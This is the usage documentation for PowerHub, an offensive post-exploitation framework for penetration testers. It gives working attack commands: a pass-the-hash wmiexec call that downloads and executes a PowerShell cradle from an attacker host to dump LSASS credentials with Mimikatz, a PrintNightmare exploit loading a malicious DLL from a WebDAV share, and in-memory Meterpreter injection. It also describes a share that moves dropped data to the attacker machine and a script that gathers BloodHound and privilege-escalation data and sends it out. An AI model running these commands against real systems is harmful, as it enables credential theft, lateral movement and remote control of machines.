# Usage

## Nomenclature

## Typical workflow

## Features

### Hub

### Modules

### File Exchange

The file exchange offers a way to transfer files via HTTP back to the host.
Think [Droopy](https://github.com/stackp/Droopy).

This feature can also be used on the command line with `PushTo-Hub`. It can transfer files or data from stdin via HTTP back to the PowerHub server.

### Static Files

TODO


### WebDAV

PowerHub also provides several WebDAV shares. You can mount it on the target as
two network drives with `Mount-WebDAV` or `mwd` (as `S:` and `R:` by
default). Be careful, it allows anonmyous access.

One drive is read-only -- maybe you can bypass a weak anti virus with this.
Some exploits require a DLL, so the idea is that you mount the  WebDAV
drive, put malicious DLLs in the read-only directory, and then load them
like this:

```powershell
PS C:\> Import-Module .\cve-2021-1675.ps1
PS C:\> Invoke-Nightmare -DLL "R:\evil-exploit-code.dll"
```

The other has two folders and is writeable by everyone:

* `public` with read/write access for everyone
* `blackhole` for dropping sensitive data. Any file placed here via WebDAV
  will immediately be moved to the `upload` directory on the attacker machine.


### profile.ps1

You can create the file `profile.ps1` in `$XDG_DATA_HOME/powerhub/` which will be automatically executed when loading PowerHub on the Windows machine. This is my `profile.ps1`:

```powershell
# Make powershell tab completion behave more like bash
try {Set-PSReadlineKeyHandler -Key Tab -Function Complete} catch {}

# Put some commands that I pretty much always want to run in one function
function Run-Init {
    Param(
        [parameter(Mandatory=$False)]
        [String]$Label = "Bloodhound"
    )
    Get-SysInfo | PushTo-Hub -Name sysinfo.txt
    Get-HubModule "PrivescCheck.ps1"
    Invoke-PrivescCheck -Extended -Report privesccheck
    PushTo-Hub "privesccheck.txt"
    Get-HubModule "sharphound.exe"
    SharpHound.exe -c All --trackcomputercalls --searchforest --zipfilename $Label --outputdirectory (Get-Location).Path
    PushTo-Hub (Get-ChildItem "*_$Label.zip")
    # To test application control and to have an awesome screenshot tool:
    Get-HubModule "Greenshot" | Run-Exe -OnDisk
}
```

### Payloads

## Examples


### Running Mimikatz on a remote system

One nice application is, for example, the case where you have obtained some
local administrator password hash and want to move laterally. This dumps the
LSASS creds with [Mimikatz](https://github.com/gentilkiwi/mimikatz) via [Impacket](https://github.com/SecureAuthCorp/impacket)'s `wmiexec.py`:

```console
$ wmiexec.py -hashes :deadbeef0000000000000000deadbeef \
    ./administrator@10.0.1.4  \
    'powershell -c "$K=new-object net.webclient;IEX $K.downloadstring(\"http://10.0.100.13:8000/\"); ghm Mimikatz; Invoke-Mimikatz | pth -Name mimikatz.txt "'
```

### Meterpreter

Let's say you want to execute a meterpreter in memory, then you do this after placing `meterpreter.exe` in `$XDG_DATA_HOME/powerhub/modules/exe` (don't forget to reload the modules!):

```
PS C:\Users\pentestuser> $K=new-object net.webclient;IEX $K.downloadstring("http://10.0.100.13:8000/0");
PS C:\Users\pentestuser> ghm ReflectivePEInjection; ghm meterpreter.exe|re
```

It should be a staged Meterpreter to keep the binary sufficiently small. I usually use `windows/x64/meterpreter/reverse_https`.

### Empire

Add an Empire launcher to the clipboard, mark it as "executable", then choose the corresponding clipboard ID as "Clip-Exec" in the PowerHub cradle builder.
